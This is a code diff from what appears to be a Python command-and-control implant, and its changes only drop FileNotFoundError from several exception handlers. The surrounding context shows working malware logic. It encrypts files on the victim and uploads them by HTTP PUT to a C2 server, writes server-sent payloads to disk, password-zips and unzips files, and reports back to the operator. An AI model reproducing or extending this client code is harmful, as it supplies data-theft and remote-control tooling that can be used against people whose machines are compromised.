@@ -83,7 +83,7 @@ while True:
                             # Decrypt the response content and write the file out to disk, then notify us on the server
                             file_handle.write(cipher.decrypt(response.content))
                         post_to_server(f"{filename} is now on {client}.\n")
-        except (FileNotFoundError, PermissionError, OSError):
+        except (PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     elif cmd.startswith(C2Commands.CLS_UP.value): # client upload
@@ -96,7 +96,7 @@ while True:
             with open(filepath, "rb") as file_handle:
                 encrypted_file = cipher.encrypt(file_handle.read())
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
-        except (FileNotFoundError, PermissionError, OSError):
+        except (PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
         
     elif cmd.startswith(C2Commands.CLS_ZIP.value): # client zip
@@ -115,7 +115,7 @@ while True:
                 else:
                     zip_file.write(filepath, filename)
                     post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
-        except (FileNotFoundError, PermissionError, OSError):
+        except (PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     elif cmd.startswith(C2Commands.CLS_UZIP.value): # client unzip
@@ -128,7 +128,7 @@ while True:
                 zip_file.setpassword(ZIP_PASSWORD)
                 zip_file.extractall(path.dirname(filename))
                 post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
-        except (FileNotFoundError, PermissionError, OSError):
+        except (PermissionError, OSError):
             post_to_server(f"{filepath} was not found on the client.\n")
     elif cmd.startswith(C2Commands.CLS_KLL.value): # client kill
         post_to_server(f"{client} has been killed.\n")
